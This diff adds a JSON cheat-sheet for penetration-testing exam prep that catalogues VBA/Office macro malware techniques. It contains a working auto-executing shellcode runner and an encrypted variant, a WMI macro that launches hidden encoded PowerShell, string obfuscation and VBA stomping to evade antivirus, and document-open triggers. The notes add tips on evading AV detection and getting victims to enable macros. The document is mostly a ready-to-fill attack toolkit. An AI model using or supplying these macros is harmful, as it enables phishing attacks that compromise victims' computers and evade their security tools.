@@ -1,0 +1,218 @@
+{
+  "category": "VBA/Office Evasion",
+  "description": "VBA macro evasion techniques for Microsoft Office exploitation. Includes shellcode execution, encryption, obfuscation, process dechaining, and VBA stomping.",
+  "commands": [
+    {
+      "id": "vba-shellcode-runner-basic",
+      "name": "VBA Shellcode Runner (Basic)",
+      "description": "Basic VBA macro for executing shellcode in memory. Uses VirtualAlloc → RtlMoveMemory → CreateThread pattern. Foundation for Office-based payloads.",
+      "category": "vba-evasion",
+      "tags": [
+        "anti-virus",
+        "AV",
+        "evasion",
+        "vba",
+        "office",
+        "macro",
+        "shellcode",
+        "windows"
+      ],
+      "command": "Private Declare PtrSafe Function CreateThread Lib \"kernel32\" (ByVal Zopqv As Long, ByVal Mqnlq As Long, ByVal Xxjvx As LongPtr, Zqcxr As Long, ByVal Txyin As Long, Bnkjk As Long) As LongPtr\nPrivate Declare PtrSafe Function VirtualAlloc Lib \"kernel32\" (ByVal Xaojl As Long, ByVal Hbzvw As Long, ByVal Cwmrq As Long, ByVal Gzpbv As Long) As LongPtr\nPrivate Declare PtrSafe Function RtlMoveMemory Lib \"kernel32\" (ByVal Dkhnw As LongPtr, ByRef Kcaob As Any, ByVal Pauic As Long) As LongPtr\n\nSub Auto_Open()\n    Dim buf As Variant\n    buf = Array(<SHELLCODE_BYTES>)\n    \n    Dim addr As LongPtr\n    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)\n    \n    Dim counter As Long\n    For counter = LBound(buf) To UBound(buf)\n        Dim data As Long\n        data = buf(counter)\n        RtlMoveMemory addr + counter, data, 1\n    Next counter\n    \n    Dim thandle As LongPtr\n    thandle = CreateThread(0, 0, addr, 0, 0, 0)\nEnd Sub",
+      "variables": [
+        {
+          "name": "<SHELLCODE_BYTES>",
+          "description": "Shellcode as VBA byte array (comma-separated decimal values)",
+          "example": "232, 130, 0, 0, 0, ...",
+          "required": true
+        }
+      ],
+      "notes": "Syntax:\nAdd to Word/Excel VBA editor (Alt+F11), insert shellcode bytes Basic runner detected by all modern AV.\n\nAlways combine with encryption (Caesar/XOR) and obfuscation.\n\nAuto_Open triggers on document open.\n\nUse AutoOpen() for compatibility.\n\nTime estimate:\n5 minutes (with shellcode generation) References:\ndocs/av-evasion/vba-evasion.md#basic-runner, PEN-300 Chapter 6.7 Manual alternative:\nUse PowerShell download cradle from VBA, WMI process creation, or COM object execution",
+      "success_indicators": [
+        "Macro executes silently when document opens (Auto_Open). Shellcode runs (e.g., Meterpreter callback)."
+      ],
+      "failure_indicators": [
+        "Macro security blocks execution - User must enable macros",
+        "64-bit Office requires PtrSafe declarations - Use 'Private Declare PtrSafe'",
+        "Shellcode doesn't execute - Verify architecture match (x86/x64)",
+        "AV blocks VirtualAlloc with PAGE_EXECUTE_READWRITE - Add encryption"
+      ]
+    },
+    {
+      "id": "vba-caesar-cipher",
+      "name": "VBA Caesar Cipher Shellcode",
+      "description": "Encrypt shellcode with Caesar cipher in VBA. Decrypt at runtime before execution. Simple obfuscation to evade static signatures in Office documents.",
+      "category": "vba-evasion",
+      "tags": [
+        "anti-virus",
+        "AV",
+        "evasion",
+        "vba",
+        "office",
+        "encryption",
+        "caesar-cipher",
+        "obfuscation"
+      ],
+      "command": "' Offline encryption (Python):\n# shellcode = [0xfc, 0x48, 0x83, ...]\n# key = 2\n# encrypted = [(b + key) % 256 for b in shellcode]\n\n' VBA decryption and execution:\nSub AutoOpen()\n    Dim buf As Variant\n    buf = Array(<ENCRYPTED_BYTES>)  ' Caesar encrypted shellcode\n    \n    ' Decrypt with Caesar cipher\n    For i = LBound(buf) To UBound(buf)\n        buf(i) = (buf(i) - <KEY>) Mod 256\n    Next i\n    \n    ' Execute (VirtualAlloc -> RtlMoveMemory -> CreateThread)\n    Dim addr As LongPtr\n    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)\n    For i = LBound(buf) To UBound(buf)\n        RtlMoveMemory addr + i, buf(i), 1\n    Next i\n    CreateThread 0, 0, addr, 0, 0, 0\nEnd Sub",
+      "variables": [
+        {
+          "name": "<ENCRYPTED_BYTES>",
+          "description": "Caesar-encrypted shellcode bytes",
+          "example": "254, 74, 133, ...",
+          "required": true
+        },
+        {
+          "name": "<KEY>",
+          "description": "Caesar cipher key (same as encryption)",
+          "example": "2",
+          "required": true
+        }
+      ],
+      "notes": "Syntax:\nEncrypt offline, paste encrypted bytes into VBA Caesar cipher is weak but better than plaintext.\n\nKey=2 is common in examples.\n\nFor exam, consider XOR for better evasion.\n\nCombine with obfuscation and dechaining.\n\nTime estimate:\n10 minutes (encryption + integration) References:\ndocs/av-evasion/vba-evasion.md#caesar-cipher, PEN-300 Chapter 6.7.1 Manual alternative:\nUse XOR encryption (stronger), AES encryption, or base64 encoding",
+      "success_indicators": [
+        "Encrypted shellcode decrypts and executes at runtime. Evades static signature scans."
+      ],
+      "failure_indicators": [
+        "Wrong key - Shellcode corrupted, won't execute",
+        "Modulo calculation error - Ensure proper wrapping (Mod 256)",
+        "Decryption loop detected - Obfuscate variable names",
+        "Still flagged - Caesar too weak, use XOR"
+      ]
+    },
+    {
+      "id": "vba-wmi-dechain",
+      "name": "VBA WMI Process Dechaining",
+      "description": "Execute payload via WMI to break parent-child process chain. Office doc → WMI → powershell breaks typical macro detection. Payload runs outside Office sandbox.",
+      "category": "vba-evasion",
+      "tags": [
+        "anti-virus",
+        "AV",
+        "evasion",
+        "vba",
+        "office",
+        "wmi",
+        "process-dechaining",
+        "powershell"
+      ],
+      "command": "Sub AutoOpen()\n    Dim payload As String\n    payload = \"powershell.exe -nop -w hidden -enc <BASE64_PAYLOAD>\"\n    \n    Dim pid As Variant\n    GetObject(\"winmgmts:\").Get(\"Win32_Process\").Create payload, Null, Null, pid\nEnd Sub",
+      "variables": [
+        {
+          "name": "<BASE64_PAYLOAD>",
+          "description": "Base64-encoded PowerShell payload (UTF-16LE)",
+          "example": "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...",
+          "required": true
+        }
+      ],
+      "notes": "Syntax:\nAdd to VBA macro, replace <BASE64_PAYLOAD> with encoded PowerShell WMI dechaining is powerful evasion technique.\n\nBreaks WINWORD -> powershell parent-child relationship that AV monitors.\n\nAlways encode PowerShell with base64.\n\nTest network connectivity first.\n\nTime estimate:\n5 minutes References:\ndocs/av-evasion/vba-evasion.md#wmi-dechaining, PEN-300 Chapter 6.8.2 Manual alternative:\nUse WScript.Shell.Run, CreateObject(\"WScript.Shell\").Exec, or scheduled task creation",
+      "success_indicators": [
+        "PowerShell process spawned by wmiprvse.exe (not WINWORD.exe). Breaks behavioral detection chains."
+      ],
+      "failure_indicators": [
+        "WMI blocked by policy - Try WScript.Shell as alternative",
+        "PowerShell execution policy - Use -ExecutionPolicy Bypass",
+        "Network connection blocked - Ensure firewall allows outbound",
+        "Base64 corruption - Use -w0 flag in base64 command"
+      ]
+    },
+    {
+      "id": "vba-string-obfuscation",
+      "name": "VBA String Obfuscation",
+      "description": "Obfuscate suspicious strings (powershell, msfvenom, http) using concatenation and character codes. Evades simple string-based signatures in VBA code.",
+      "category": "vba-evasion",
+      "tags": [
+        "anti-virus",
+        "AV",
+        "evasion",
+        "vba",
+        "office",
+        "obfuscation",
+        "string-manipulation"
+      ],
+      "command": "' Method 1: String concatenation\nDim cmd As String\ncmd = \"power\" & \"shell\" & \".exe\"\n\n' Method 2: Chr() function\ncmd = Chr(112) & Chr(111) & Chr(119) & Chr(101) & Chr(114) & Chr(115) & Chr(104) & Chr(101) & Chr(108) & Chr(108)\n\n' Method 3: StrReverse()\ncmd = StrReverse(\"exe.llehsrewop\")\n\n' Method 4: Replace()\ncmd = Replace(\"pXwXrshell.exe\", \"X\", \"o\")",
+      "variables": [],
+      "notes": "Syntax:\nApply to suspicious strings in VBA code String obfuscation is quick win (~10 min).\n\nAlways obfuscate 'powershell', 'cmd', 'http', 'IEX', 'msfvenom'.\n\nUse random variable names (avoid shellcode, payload, etc.).\n\nCombine all methods for best results.\n\nTime estimate:\n10 minutes References:\ndocs/av-evasion/vba-evasion.md#obfuscation, PEN-300 Chapter 6.8.3 Manual alternative:\nUse variable substitution, encoded strings, or external data sources (document properties, hidden cells)",
+      "success_indicators": [
+        "Obfuscated strings bypass simple signature matching. Code executes normally."
+      ],
+      "failure_indicators": [
+        "Over-obfuscation breaks functionality - Test after each obfuscation",
+        "Chr() values wrong - Verify ASCII codes",
+        "Still detected by heuristics - Combine with encryption and dechaining"
+      ]
+    },
+    {
+      "id": "vba-stomping",
+      "name": "VBA Stomping (P-Code Manipulation)",
+      "description": "Remove VBA source code while preserving compiled p-code. Office executes p-code even if source removed. Analysis tools see empty/garbage VBA, can't analyze logic.",
+      "category": "vba-evasion",
+      "tags": [
+        "anti-virus",
+        "AV",
+        "evasion",
+        "vba",
+        "office",
+        "stomping",
+        "p-code",
+        "advanced"
+      ],
+      "command": "# VBA stomping workflow:\n# 1. Create malicious VBA macro in Office document\n# 2. Save as .doc (legacy format required for stomping)\n# 3. Use EvilClippy to stomp VBA source:\nEvilClippy.exe -s <INPUT_DOC> -o <OUTPUT_DOC>\n\n# Manual method:\n# 1. Open .doc in hex editor\n# 2. Locate VBA source code section\n# 3. Replace with garbage/nulls while preserving p-code\n# 4. Save and test",
+      "variables": [
+        {
+          "name": "<INPUT_DOC>",
+          "description": "Original .doc with VBA macro",
+          "example": "payload.doc",
+          "required": true
+        },
+        {
+          "name": "<OUTPUT_DOC>",
+          "description": "Stomped output document",
+          "example": "payload_stomped.doc",
+          "required": true
+        }
+      ],
+      "prerequisites": [],
+      "notes": "Syntax:\nUse EvilClippy tool or manual hex editing Advanced technique, requires EvilClippy tool.\n\nExtremely effective against static analysis and sandboxes.\n\nOnly works on .doc (not .docx).\n\nTest macro BEFORE stomping - can't debug after.\n\nSave original.\n\nPractice on lab before exam.\n\nTime estimate:\n15 minutes (with EvilClippy) References:\ndocs/av-evasion/vba-evasion.md#vba-stomping, https://github.com/outflanknl/EvilClippy, PEN-300 Chapter 6.7.2 Manual alternative:\nUse OfficeMalScanner, olevba, or manual p-code analysis/manipulation",
+      "success_indicators": [
+        "Stomped document opens normally, macro executes. VBA editor shows empty/garbage code. Static analysis tools fail to extract meaningful source."
+      ],
+      "failure_indicators": [
+        ".docx format used - Must use legacy .doc format",
+        "P-code corrupted - Test before stomping, stomp carefully",
+        "Modern Office versions may fail - Works best on Office 2016 and earlier",
+        "AV still detects behavior - Stomping only evades static analysis"
+      ]
+    },
+    {
+      "id": "vba-autoopen-variants",
+      "name": "VBA Auto-Execution Methods",
+      "description": "Various methods to trigger VBA macro execution automatically. Auto_Open, AutoOpen, Document_Open, Workbook_Open for different Office versions and scenarios.",
+      "category": "vba-evasion",
+      "tags": [
+        "anti-virus",
+        "AV",
+        "evasion",
+        "vba",
+        "office",
+        "auto-execution",
+        "macro-triggers"
+      ],
+      "command": "' Method 1: Auto_Open (Word/Excel - legacy)\nSub Auto_Open()\n    ' Your payload\nEnd Sub\n\n' Method 2: AutoOpen (Word - no underscore)\nSub AutoOpen()\n    ' Your payload\nEnd Sub\n\n' Method 3: Document_Open (Word - modern)\nPrivate Sub Document_Open()\n    ' Your payload\nEnd Sub\n\n' Method 4: Workbook_Open (Excel)\nPrivate Sub Workbook_Open()\n    ' Your payload\nEnd Sub\n\n' Method 5: AutoExec (Word - on close)\nSub AutoExec()\n    ' Your payload\nEnd Sub",
+      "variables": [],
+      "notes": "Syntax:\nChoose appropriate method for Office version and app Always implement Auto_Open AND AutoOpen for Word (compatibility).\n\nExcel uses Workbook_Open.\n\nTest on target Office version if known.\n\nSocial engineering required to convince user to enable macros.\n\nTime estimate:\n2 minutes References:\ndocs/av-evasion/vba-evasion.md#auto-execution Manual alternative:\nUse ActiveX controls, form events, or button click handlers for user-initiated execution",
+      "success_indicators": [
+        "Macro executes automatically when document opens (if macros enabled)."
+      ],
+      "failure_indicators": [
+        "Wrong trigger for Office version - Use multiple for compatibility",
+        "Macro security blocks execution - User must enable macros",
+        "Nothing happens - Check VBA editor for errors"
+      ]
+    }
+  ],
+  "oscp_relevance": "Critical for client-side attacks and phishing scenarios. Office macros common initial access vector. Must know encryption, obfuscation, and dechaining for exam success.",
+  "attack_chain_position": "Initial Access, Phishing, Client-Side Exploitation",
+  "related_categories": [
+    "office-exploitation",
+    "phishing",
+    "windows"
+  ]
+}
